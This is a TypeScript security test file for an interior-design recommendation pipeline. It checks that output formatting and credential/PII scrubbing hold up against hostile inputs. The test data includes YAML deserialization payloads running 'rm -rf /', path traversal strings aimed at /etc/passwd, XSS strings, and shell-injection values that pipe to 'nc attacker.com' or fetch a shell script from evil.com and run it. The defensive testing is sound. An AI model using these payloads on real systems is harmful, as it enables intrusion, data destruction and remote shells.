/**
 * Security.test.ts - Security hardening tests for Designer pipeline
 *
 * Tests:
 *   - YAML injection defense: !!python/object, !!js/function, etc.
 *   - Credential scrubbing: API keys, AWS keys, Bearer tokens, Google keys
 *   - Image payload safety: path traversal, shell injection
 *   - Budget manipulation: negative prices, NaN, Infinity, extreme values
 *   - XSS in product data: HTML/script tags sanitization
 *
 * @module Security.test
 */

import { describe, it, expect } from "bun:test";
import { scrubCredentials, formatAsMarkdown, formatAsJson, type DesignRecommendation } from "../OutputFormatter.ts";
import { scrubPII } from "../AuditLogger.ts";
import { calculateBudgetResult, type ProductForBudget } from "../BudgetCalculator.ts";

// ---------------------------------------------------------------------------
// Helper: build a minimal recommendation for testing
// ---------------------------------------------------------------------------

function makeRec(overrides?: Partial<DesignRecommendation>): DesignRecommendation {
  return {
    roomName: "Test Room",
    style: "modern",
    analysis: {
      strengths: ["Good light"],
      opportunities: ["More plants"],
      lightingAssessment: "Adequate",
      colorCoherence: "7/10",
    },
    actions: [
      { suggestion: "Add lamp", impact: "medium", estimatedCost: 100, priority: 1, category: "lighting" },
    ],
    products: [],
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// YAML Injection Defense
// ---------------------------------------------------------------------------

describe("Security - YAML Injection Defense", () => {
  it("rejects !!python/object in config-like strings", () => {
    const maliciousInput = '!!python/object/apply:os.system ["rm -rf /"]';

    // The config loader uses the `yaml` library's safe parsing by default
    // Test that raw YAML payloads in product names are treated as plain strings
    const rec = makeRec({
      products: [
        { name: maliciousInput, price: 100, retailer: "Evil Corp", styleMatchScore: 0.5 },
      ],
    });

    const output = formatAsMarkdown(rec);
    // The YAML payload is treated as plain text data, never parsed/executed
    // It appears literally in the output which is safe (it's just a product name string)
    expect(output).toContain("!!python");
    // Verify the output is still valid markdown structure (not corrupted by the payload)
    expect(output).toContain("## Room Analysis");
    expect(output).toContain("## Recommended Products");
  });

  it("rejects !!js/function in config strings", () => {
    const malicious = '!!js/function "function(){return process.exit(1)}"';
    const rec = makeRec({
      products: [
        { name: malicious, price: 50, retailer: "Test", styleMatchScore: 0.5 },
      ],
    });
    const output = formatAsMarkdown(rec);
    // Should complete without executing the function
    expect(output).toContain("## Room Analysis");
  });

  it("treats YAML special sequences as plain text in product data", () => {
    const yamlPayloads = [
      '!!binary "SGVsbG8="',
      "!!merge <<: *default",
      "!!null ~",
      '!!str "test"',
      "!!seq [1,2,3]",
      "!!map {a: 1}",
    ];

    for (const payload of yamlPayloads) {
      const rec = makeRec({
        products: [{ name: payload, price: 10, retailer: "Test", styleMatchScore: 0.5 }],
      });
      const output = formatAsJson(rec);
      const parsed = JSON.parse(output);
      expect(parsed.products[0].name).toBe(payload);
    }
  });
});

// ---------------------------------------------------------------------------
// Credential Scrubbing
// ---------------------------------------------------------------------------

describe("Security - Credential Scrubbing", () => {
  it("scrubs Anthropic API keys (sk-ant-api03-xxx)", () => {
    const input = "Error calling api_key=sk-ant-api03-abc123def456ghi789jkl012mno345pqr678stu901";
    const scrubbed = scrubCredentials(input);
    expect(scrubbed).not.toContain("sk-ant-api03");
    expect(scrubbed).toContain("REDACTED");
  });

  it("scrubs AWS access keys (AKIA...)", () => {
    const input = "AWS key: AKIAIOSFODNN7EXAMPLE";
    const scrubbed = scrubCredentials(input);
    expect(scrubbed).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(scrubbed).toContain("AWS_KEY_REDACTED");
  });

  it("scrubs Bearer tokens", () => {
    const input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0";
    const scrubbed = scrubCredentials(input);
    expect(scrubbed).not.toContain("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9");
    expect(scrubbed).toContain("TOKEN_REDACTED");
  });

  it("scrubs generic secret keys (sk-xxx pattern)", () => {
    const input = "secret: sk-1234567890abcdefghij1234567890ab";
    const scrubbed = scrubCredentials(input);
    expect(scrubbed).not.toContain("sk-1234567890abcdefghij");
    expect(scrubbed).toContain("REDACTED");
  });

  it("scrubs API keys embedded in formatted output", () => {
    const rec = makeRec({
      metadata: {
        debug: "api_key=sk-ant-api03-SUPERSECRETKEYTHATNEEDSREDACTION123456",
        awsKey: "AKIAIOSFODNN7EXAMPLE",
      },
    });

    const jsonOutput = formatAsJson(rec);
    expect(jsonOutput).not.toContain("sk-ant-api03");
    expect(jsonOutput).not.toContain("AKIAIOSFODNN7EXAMPLE");

    const mdOutput = formatAsMarkdown(rec);
    expect(mdOutput).not.toContain("sk-ant-api03");
  });

  it("scrubs credentials from markdown output", () => {
    const rec = makeRec({
      metadata: {
        error: "Failed with Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwcyIsImF1ZCI6ImRldiJ9",
      },
    });

    const output = formatAsMarkdown(rec);
    expect(output).not.toContain("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9");
    expect(output).toContain("TOKEN_REDACTED");
  });

  it("preserves non-credential content unchanged", () => {
    const input = "Room analysis complete. Style: Modern Cozy. Confidence: 0.85";
    const scrubbed = scrubCredentials(input);
    expect(scrubbed).toBe(input);
  });

  it("handles empty and null input safely", () => {
    expect(scrubCredentials("")).toBe("");
    expect(scrubCredentials(null as any)).toBe(null);
    expect(scrubCredentials(undefined as any)).toBe(undefined);
  });
});

// ---------------------------------------------------------------------------
// PII Scrubbing (AuditLogger)
// ---------------------------------------------------------------------------

describe("Security - PII Scrubbing", () => {
  it("scrubs Unix file paths from error messages", () => {
    const input = "Error reading ~/Documents/room-photo.jpg";
    const scrubbed = scrubPII(input);
    expect(scrubbed).not.toContain("/Users/your-username");
    expect(scrubbed).toContain("PATH_REDACTED");
  });

  it("scrubs email addresses", () => {
    const input = "Logged by user@example.com at 2024-01-01";
    const scrubbed = scrubPII(input);
    expect(scrubbed).not.toContain("user@example.com");
    expect(scrubbed).toContain("EMAIL_REDACTED");
  });

  it("scrubs Windows file paths", () => {
    const input = "Error reading C:\\Users\\john\\Documents\\room.jpg";
    const scrubbed = scrubPII(input);
    expect(scrubbed).not.toContain("C:\\Users\\john");
    expect(scrubbed).toContain("PATH_REDACTED");
  });

  it("scrubs home directory paths", () => {
    const input = "Cache stored at /home/designer/.cache/analysis.json";
    const scrubbed = scrubPII(input);
    expect(scrubbed).not.toContain("/home/designer");
    expect(scrubbed).toContain("PATH_REDACTED");
  });
});

// ---------------------------------------------------------------------------
// Image Payload Safety
// ---------------------------------------------------------------------------

describe("Security - Image Payload Safety", () => {
  it("handles path traversal filenames safely", () => {
    const maliciousPaths = [
      "../../etc/passwd",
      "../../../etc/shadow",
      "..\\..\\windows\\system32\\config\\sam",
      "/etc/passwd%00.jpg",
      "room%2F..%2F..%2Fetc%2Fpasswd.jpg",
    ];

    for (const path of maliciousPaths) {
      const rec = makeRec({
        metadata: { imagePath: path },
      });
      const output = formatAsJson(rec);
      // Should not crash, output should be valid JSON
      const parsed = JSON.parse(output);
      expect(parsed).toBeDefined();
    }
  });

  it("handles shell injection in filenames safely", () => {
    const maliciousNames = [
      "; rm -rf /",
      "$(cat /etc/passwd)",
      "`whoami`",
      "| nc attacker.com 4444",
      "&& curl evil.com/shell.sh | bash",
    ];

    for (const name of maliciousNames) {
      const rec = makeRec({
        products: [{ name, price: 100, retailer: "Test", styleMatchScore: 0.5 }],
      });
      const output = formatAsJson(rec);
      const parsed = JSON.parse(output);
      // The name is preserved as-is (it's just data, not executed)
      expect(parsed.products[0].name).toBe(name);
    }
  });

  it("handles extremely long filenames without crash", () => {
    const longName = "a".repeat(10000);
    const rec = makeRec({
      metadata: { imagePath: longName },
    });
    const output = formatAsJson(rec);
    expect(output).toBeDefined();
    expect(output.length).toBeGreaterThan(0);
  });

  it("handles null bytes in filenames safely", () => {
    const rec = makeRec({
      metadata: { imagePath: "room\x00.jpg" },
    });
    const output = formatAsJson(rec);
    const parsed = JSON.parse(output);
    expect(parsed).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// Budget Manipulation
// ---------------------------------------------------------------------------

describe("Security - Budget Manipulation", () => {
  it("handles negative product prices", () => {
    const products: ProductForBudget[] = [
      { name: "Negative Item", price: -500, category: "exploit" },
      { name: "Normal Item", price: 200, category: "furniture" },
    ];

    const result = calculateBudgetResult(products, 1000);
    // Should not crash; total reflects the actual sum
    expect(result).toBeDefined();
    expect(typeof result.total_cost).toBe("number");
  });

  it("handles NaN product prices without crash", () => {
    const products: ProductForBudget[] = [
      { name: "NaN Item", price: NaN, category: "exploit" },
      { name: "Normal Item", price: 200, category: "furniture" },
    ];

    const result = calculateBudgetResult(products, 1000);
    expect(result).toBeDefined();
    // NaN propagation is acceptable but should not crash
    expect(typeof result.total_cost).toBe("number");
  });

  it("handles Infinity product prices without crash", () => {
    const products: ProductForBudget[] = [
      { name: "Infinite Item", price: Infinity, category: "exploit" },
      { name: "Normal Item", price: 200, category: "furniture" },
    ];

    const result = calculateBudgetResult(products, 1000);
    expect(result).toBeDefined();
    expect(typeof result.total_cost).toBe("number");
  });

  it("handles extremely large product prices", () => {
    const products: ProductForBudget[] = [
      { name: "Expensive Item", price: Number.MAX_SAFE_INTEGER, category: "luxury" },
    ];

    const result = calculateBudgetResult(products, 1000);
    expect(result).toBeDefined();
    expect(result.total_cost).toBe(Number.MAX_SAFE_INTEGER);
    expect(result.budget_status).toBe("over");
  });

  it("handles zero budget limit", () => {
    const products: ProductForBudget[] = [
      { name: "Any Item", price: 1, category: "furniture" },
    ];

    const result = calculateBudgetResult(products, 0);
    expect(result).toBeDefined();
    expect(result.budget_status).toBe("over");
  });

  it("handles negative budget limit", () => {
    const products: ProductForBudget[] = [
      { name: "Item", price: 100, category: "furniture" },
    ];

    const result = calculateBudgetResult(products, -1000);
    expect(result).toBeDefined();
    // With negative budget, everything should be over
    expect(result.budget_status).toBe("over");
  });

  it("handles empty product list", () => {
    const result = calculateBudgetResult([], 1000);
    expect(result).toBeDefined();
    expect(result.total_cost).toBe(0);
    expect(result.per_category.length).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// XSS in Product Data
// ---------------------------------------------------------------------------

describe("Security - XSS in Product Data", () => {
  it("includes HTML script tags as literal text (not rendered)", () => {
    const rec = makeRec({
      products: [
        {
          name: '<script>alert("XSS")</script>',
          price: 100,
          retailer: "Evil Corp",
          styleMatchScore: 0.5,
        },
      ],
    });

    const jsonOutput = formatAsJson(rec);
    const parsed = JSON.parse(jsonOutput);
    // JSON output preserves the literal string (safe for JSON consumers)
    expect(parsed.products[0].name).toBe('<script>alert("XSS")</script>');

    // Markdown output also contains it as-is (markdown does not execute scripts)
    const mdOutput = formatAsMarkdown(rec);
    expect(mdOutput).toContain("script");
  });

  it("handles HTML tags in product descriptions", () => {
    const rec = makeRec({
      products: [
        {
          name: '<img src=x onerror="alert(1)">',
          price: 50,
          retailer: '<a href="evil.com">Click</a>',
          styleMatchScore: 0.5,
        },
      ],
    });

    const output = formatAsJson(rec);
    // Should not crash, output valid JSON
    const parsed = JSON.parse(output);
    expect(parsed.products[0].name).toContain("img");
    expect(parsed.products[0].retailer).toContain("href");
  });

  it("handles event handler injection in metadata", () => {
    const rec = makeRec({
      metadata: {
        onload: 'javascript:alert("XSS")',
        onclick: "steal(document.cookie)",
      },
    });

    const output = formatAsJson(rec);
    const parsed = JSON.parse(output);
    // Data preserved as-is (JSON is safe transport)
    expect(parsed.metadata.onload).toContain("javascript");
    expect(parsed.metadata.onclick).toContain("steal");
  });

  it("handles CSS injection in product names", () => {
    const rec = makeRec({
      products: [
        {
          name: "Nice Lamp</td><style>body{display:none}</style>",
          price: 100,
          retailer: "Test",
          styleMatchScore: 0.5,
        },
      ],
    });

    const output = formatAsMarkdown(rec);
    // Should complete without issue
    expect(output).toContain("## Room Analysis");
    expect(output).toContain("Nice Lamp");
  });

  it("handles Unicode injection attempts", () => {
    const rec = makeRec({
      products: [
        {
          name: "Normal\u200B\u200BProduct\u200B",
          price: 100,
          retailer: "Test\u2028Line\u2029Break",
          styleMatchScore: 0.5,
        },
      ],
    });

    const output = formatAsJson(rec);
    const parsed = JSON.parse(output);
    expect(parsed.products[0].name).toContain("Normal");
  });
});
